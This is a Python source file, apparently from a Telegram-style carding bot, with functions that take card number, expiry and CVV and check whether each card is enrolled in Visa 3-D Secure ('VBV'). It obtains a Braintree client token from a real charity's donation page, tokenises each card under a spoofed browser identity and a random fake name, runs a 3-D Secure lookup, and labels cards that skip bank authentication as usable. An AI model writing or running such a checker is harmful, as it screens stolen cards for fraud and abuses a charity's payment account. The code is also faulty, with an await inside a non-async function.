import traceback
from FUNC.usersdb_func import *
def vbvcheck(input):
    vbv_token = open("FILES/vbv_token.txt",encoding="UTF-8").read()
    import re, requests, string
    import time
    import random
    import base64
    import json
    session = requests.session()
    start = time.time()
    #NECESSARY THINGS FOR MAKING REQUEST
    letters = string.ascii_lowercase
    First = ''.join(random.choice(letters) for i in range(6))
    Last = ''.join(random.choice(letters) for i in range(6))
    PWD = ''.join(random.choice(letters) for i in range(10))
    Name = f'{First}+{Last}'
    Email = f'{First}.{Last}@gmail.com'
    UA = 'Mozilla/5.0 (X11; Linux i686; rv:102.0) Gecko/20100101 Firefox/102.0'

    ccn = input.split("|")[0]
    mm = input.split("|")[1]
    yy = input.split("|")[2]
    cvv = input.split("|")[3]

    #VBV LOOKUP REQUEST STARTING

    #CREATE STRIPE REQUEST FOR GETTING GUID,MUID,SUID
    surl = "https://m.stripe.com/6"
    sheaders = {
        "user-agent": UA,
        "accept": "application/json, text/plain, */*",
        "content-type": "application/x-www-form-urlencoded"
    }
    getstripe = session.post(url=surl, headers=sheaders).json()
    guid = getstripe['guid']
    muid = getstripe['muid']
    sid = getstripe['sid']

    #CREATE FIRST REQUEST FOR VBV LOOKUP
    url1 = "https://charliewaller.org/umbraco/BraintreeDonation/BraintreeDonationSurface/ClientToken"
    headers1 = {
        "user-agent": UA,
        "accept": "application/json, text/plain, */*",
        "content-type": "application/x-www-form-urlencoded"
    }
    result1 = session.get(url=url1, headers=headers1).json()
    getclient_token = result1['clientToken']
    clientToken = base64.b64decode(getclient_token)
    content = json.loads(clientToken.decode('utf-8'))
    bearer = content['authorizationFingerprint']

    #CREATE SECOND REQUEST FOR VBV LOOKUP
    url2 = "https://payments.braintree-api.com/graphql"
    headers2 = {
        "user-agent": UA,
        "content-type": "application/json",
        "authorization": "Bearer " + bearer,
        "braintree-Version": "2018-05-10",
        "host": "payments.braintree-api.com",
        "origin": "https://assets.braintreegateway.com",
        "referer": "https://assets.braintreegateway.com/"
    }
    payload2 = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "dropin2",
            "sessionId": guid
        },
        "query":
        "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!){   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
        "variables": {
            "input": {
                "creditCard": {
                    "number": ccn,
                    "expirationMonth": mm,
                    "expirationYear": yy,
                    "cvv": cvv,
                    "cardholderName": First + " botne"
                },
                "options": {
                    "validate": "false"
                }
            }
        },
        "operationName": "TokenizeCreditCard"
    }

    result2 = requests.post(url=url2, json=payload2, headers=headers2).json()
    token1 = result2['data']['tokenizeCreditCard']['token']
    bin = result2['data']['tokenizeCreditCard']['creditCard']['bin']
    bindata = result2['data']['tokenizeCreditCard']['creditCard']['binData']

    #CREATE THIRD REQUEST FOR VBV LOOKUP
    url3 = f"https://api.braintreegateway.com/merchants/zhqjdd67457jvj8k/client_api/v1/payment_methods/{token1}/three_d_secure/lookup"
    head3 = {
        "user-agent": UA,
        "accept": "*/*",
        "accept-Language": "en-GB,en;q=0.9,en-US;q=0.8",
        "host": "api.braintreegateway.com",
        "origin": "https://charliewaller.org",
        "referer": "https://charliewaller.org/"
    }
    payload3 = {
        "amount": "1",
        "additionalInfo": {
            "acsWindowSize": "03"
        },
        "bin": bin,
        "dfReferenceId": f"{vbv_token}",
        "clientMetadata": {
            "requestedThreeDSecureVersion": "2",
            "sdkVersion": "web/3.58.0",
            "cardinalDeviceDataCollectionTimeElapsed": 842,
            "issuerDeviceDataCollectionTimeElapsed": 602,
            "issuerDeviceDataCollectionResult": "true"
        },
        "authorizationFingerprint": bearer,
        "braintreeLibraryVersion": "braintree/web/3.58.0",
        "_meta": {
            "merchantAppId": "charliewaller.org",
            "platform": "web",
            "sdkVersion": "3.58.0",
            "source": "client",
            "integration": "custom",
            "integrationType": "custom",
            "sessionId": guid
        }
    }

    result3 = session.post(url=url3, headers=head3, json=payload3)
    try:
        threeDSecureInfo = result3.json()['paymentMethod']['threeDSecureInfo']
        status = threeDSecureInfo['status']
    except:
        return "ERROR", result3.text
    end = time.time()
    #GIVING THE RESPONSE OF VBV LOOKUP
    if 'bypassed' in result3.text:
        return "NON_VBV",status

    elif 'authenticate_attempt_successful' in result3.text:
        return "NON_VBV",status

    elif 'authenticate_successful' in result3.text:
        return "NON_VBV",status

    elif 'lookup_not_enrolled' in result3.text:
        return "NON_VBV",status

    elif 'authentication_unavailable' in result3.text:
        return "NON_VBV",status
    elif "lookup_error" in result3.text:
        return "API DEAD",status

    else:
        return "VBV",status

def massvbv(input,user_id):
    try:
        result = vbvcheck(input)
        if result[0]=="NON_VBV":
            status = "NON VBV ✅"
            response = result[1]
        elif result[0]=="VBV":
            status = "VBV ❌"
            response = result[1]
        elif result[0]=="API DEAD":
            status = "Error ❌"
            response = "Lookup Error "
            refundcredit(user_id)
        else:
            status = "Error ❌"
            response = f"Card Declined 🚫"
            try:
                with open ("FILES/Result_Logs.txt", "a") as f:
                    f.write(f"{result}\n")
            except:
                pass
            refundcredit(user_id)

        return (f"<code>{input}</code>\n<b>Result - {status}</b>\n")
    except Exception as e:
        import traceback
        await error_log(traceback.format_exc())
